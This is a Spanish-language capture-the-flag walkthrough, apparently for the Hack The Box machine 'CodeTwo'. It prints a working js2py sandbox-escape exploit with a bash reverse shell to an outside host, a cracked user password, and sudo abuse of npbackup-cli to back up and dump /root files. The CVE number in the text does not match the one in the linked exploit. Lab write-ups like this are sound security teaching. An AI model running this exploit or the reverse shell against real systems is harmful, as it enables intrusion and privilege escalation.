---
layout: post
title:  "CodeTwo"
tags: ["RCE", "CVE"]
categories: ["Linux", Medium]
image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/992c992925936b399906f2a78a740eea.png"
---

```java
sudo nmap -p22,8000 -sC -sV -oN nmap/target 10.10.11.82
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 15:25 CEST
Nmap scan report for 10.10.11.82
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.56 seconds
```

Página web

![](/assets/machines/codetwo.htb/images/daa66ca7-c99d-4a22-a47f-8e1ba2a76651.webp)

El botón "DOWNLOAD APP" descargará un .zip, el cual contiene el código fuente de la aplicación.

```py
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

Se esta usando la librería js2py.

> js2py: Translates JavaScript to Python code. Js2Py is able to translate and execute virtually any JavaScript code.


Registro de usuario

![](/assets/machines/codetwo.htb/images/d13495d3-1767-419b-aef7-b241b7a3a249.webp)

Login de usuario

![](/assets/machines/codetwo.htb/images/1c302ac8-7595-4449-ae27-59a2ec7e1dba.webp)

Podemos ejecutar código Javascript que será convertido a Python por medio de la líbreria.

![](/assets/machines/codetwo.htb/images/0f2b2967-4527-45fd-be5d-3ab196726646.webp)

El CVE-2024-28307 nos permite ejecutar código (RCE), usaremos esto para ejecutar un reverse shell.

https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

```javascript
let cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.73/9000 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
```


Obtención de reverse shell
![](/assets/machines/codetwo.htb/images/d1d4d716-635b-4d30-bd82-e71a19bdbfd2.webp)

Encontramos el archivo `user.db` con unos hashes.

![](/assets/machines/codetwo.htb/images/17b914eb-8c21-40eb-846c-1a89d67686b7.webp)

Obtenemos las credenciales del usuario marco.

![](/assets/machines/codetwo.htb/images/830783fb-075e-4127-8145-2de29a3721f4.webp)

Credenciales crackeadas: ``marco:sweetangelbabylove``

```
marco@codetwo:/home/app/app/instance$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Existe un archivo ``npbackup.conf``
```
drwx------ 7 root root  4096 Apr  6 03:50 backups
-rw-rw-r-- 1 root root  2893 Jun 18 11:16 npbackup.conf
-rw-r----- 1 root marco   33 Aug 20 14:30 user.txt
```

Se puede ejecutar el comando `/usr/local/bin/npbackup-cli` como root.

```
marco@codetwo:~$ cp npbackup.conf /tmp
marco@codetwo:~$ cd /tmp
marco@codetwo:/tmp$ nano npbackup.conf
```

Copiamos y modificamos el archivo `npbackup.conf` para hacer un backup a `/root`.

```
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /root
<SNIP>
```

Realizar un backup con el siguiente comando
```
marco@codetwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c ./npbackup.conf -b 
2025-08-20 14:32:28,060 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-20 14:32:28,092 :: INFO :: Loaded config E1057128 in /tmp/npbackup.conf
2025-08-20 14:32:28,104 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2025-08-20 14:32:30,907 :: INFO :: Snapshots listed successfully
<SNIP>
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.612 KiB (39.879 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot 263ce169 saved
ner took 7.530214 seconds for backup
2025-08-20 14:32:35,632 :: INFO :: Operation finished
2025-08-20 14:32:35,648 :: INFO :: ExecTime = 0:00:07.590910, finished, state is: errors.
2025-08-20 14:32:35,629 :: INFO :: Backend finished with success
2025-08-20 14:32:35,631 :: INFO :: Processed 197.7 KiB of data
2025-08-20 14:32:35,631 :: ERROR :: Backup is smaller than configured minmium backup size
2025-08-20 14:32:35,631 :: ERROR :: Operation finished with failure
2025-08-20 14:32:35,632 :: INFO :: Runner took 7.530214 seconds for backup
2025-08-20 14:32:35,632 :: INFO :: Operation finished
2025-08-20 14:32:35,648 :: INFO :: ExecTime = 0:00:07.590910, finished, state is: errors.
```

Visualizar que el snapshot se ha realizado correctamente.

```
arco@codetwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c ./npbackup.conf -s
2025-08-20 14:32:42,326 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-20 14:32:42,564 :: INFO :: Loaded config E1057128 in /tmp/npbackup.conf
2025-08-20 14:32:42,579 :: INFO :: Listing snapshots of repo default
ID        Time                 Host        Tags        Paths          Size
---------------------------------------------------------------------------------
35a4dac3  2025-04-06 03:50:16  codetwo                 /home/app/app  48.295 KiB
263ce169  2025-08-20 14:32:32  codetwo                 /root          197.660 KiB
---------------------------------------------------------------------------------
2 snapshots
2025-08-20 14:32:48,423 :: INFO :: Snapshots listed successfully
2025-08-20 14:32:48,423 :: INFO :: Runner took 5.844779 seconds for snapshots
2025-08-20 14:32:48,423 :: INFO :: Operation finished
2025-08-20 14:32:48,431 :: INFO :: ExecTime = 0:00:06.106899, finished, state is: success.
```

Usar el comando ``-f ``y ``--dump`` para mostrar el fichero `/root/root.txt`

```
marco@codetwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c ./npbackup.conf -f --dump /root/root.txt
ea8ebc6fdb4eba19106bc30bb470d399
```